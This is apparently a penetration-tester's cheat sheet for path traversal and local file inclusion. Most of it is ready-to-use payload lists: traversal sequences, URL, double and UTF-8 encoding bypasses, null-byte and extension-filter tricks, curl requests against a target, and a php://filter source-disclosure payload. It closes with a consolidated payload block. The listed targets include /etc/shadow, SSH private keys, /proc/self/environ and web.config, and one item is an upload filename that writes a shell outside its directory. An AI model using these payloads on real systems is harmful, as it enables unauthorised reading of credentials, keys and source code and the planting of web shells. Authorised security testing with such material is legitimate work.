# Path Traversal

## Common targets:
- /etc/passwd
- application source files
- configuration files
- Windows system files
- web.config / .env / database configs


## 1. Basic Testing

## Typical vulnerable parameters

```
?page=
?file=
?path=
?template=
?download=
?doc=
```

#### Example:

```
GET /download?file=report.pdf
```

#### Test:

```
GET /download?file=../../../../etc/passwd
```


## 2. Basic Traversal Payloads

### Linux

```
../
../../
../../../
../../../../
```

#### Target:

```
../../../../etc/passwd
../../../../etc/hosts
../../../../var/www/html/index.php
```


### Windows

```
..\ 
..\..\ 
..\..\..\ 
```

#### Target:

```
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
```


## 3. Absolute Path Bypass

If traversal blocked, try absolute paths:

### Linux

```
/etc/passwd
/var/www/html/index.php
```

### Windows

```
C:\windows\win.ini
C:\inetpub\web.config
```


## 4. Encoding Bypasses

If `../` blocked, try encoding.

### URL Encoding

```
%2e%2e%2f
%2e%2e/
..%2f
%2e%2e/
```

### Example:

```
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

---

### Double Encoding

```
%252e%252e%252f
```


### UTF-8 Encoding

```
%c0%ae%c0%ae%c0%af
```

## 5. Mixed Traversal Variants

```
....//
....\/
..../
..././
.././
```

### Example:

```
....//....//....//etc/passwd
```

---

## 6. Null Byte Injection (Older Systems)

```
../../../../etc/passwd%00
```

### Used when extension is appended:

```
?page=../../../../etc/passwd%00.php
```

## 7. Bypass Extension Filters

### If app appends `.php`:

```
?page=../../../../etc/passwd
```

#### Try:

```
?page=../../../../etc/passwd%00
```

### If filter blocks `.php`:

```
?page=../../../../etc/passwd/.
```

### Or:

```
?page=../../../../etc/passwd%00.jpg
```

## 8. Filter Bypass Tricks

### Add trailing slash

```
../../../../etc/passwd/
```

### Add dot

```
../../../../etc/passwd/.
```

### Add extra traversal

```
../../../../../../../../etc/passwd
```

## 9. Testing with curl

```
curl "http://target/download?file=../../../../etc/passwd"
```

### With encoding:

```
curl "http://target/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

# 10. Burp Workflow

1. Intercept request
2. Send to Repeater
3. Replace filename with traversal payload
4. Compare response length
5. Look for:
   - passwd format (root:x:0:0:)
   - Windows config format
   - HTML source code
   - error messages revealing paths

## 11. Common Target Files

### Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/www/html/index.php
/home/user/.ssh/id_rsa
```

### Windows

```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\web.config
C:\xampp\apache\conf\httpd.conf
```

## 12. LFI Combination

### If file included via:

```
?page=
```

#### Try:

```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
```

Decode output.

## 13. Traversal in File Upload Context

### If file name used insecurely:

```
filename=../../shell.php
```

May allow writing outside intended directory.


## Full Payload Block 

```
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../../etc/passwd

..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts

/../../../../etc/passwd
/../../../etc/passwd
/etc/passwd
C:\windows\win.ini

../../../../etc/passwd/
../../../../etc/passwd/.
../../../../etc/passwd%00
../../../../etc/passwd%00.php
../../../../etc/passwd%00.jpg

....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..././..././..././etc/passwd
.././.././.././etc/passwd

..%2f..%2f..%2f..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

%252e%252e%252f%252e%252e%252fetc/passwd

%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd

..\\..\\..\\..\\windows\\win.ini
%2e%2e\\%2e%2e\\windows\\win.ini

../../../../var/www/html/index.php
../../../../proc/self/environ
../../../../etc/hosts

?page=../../../../etc/passwd
?file=../../../../etc/passwd
?path=../../../../etc/passwd
?template=../../../../etc/passwd
?download=../../../../etc/passwd

?page=php://filter/convert.base64-encode/resource=index.php
```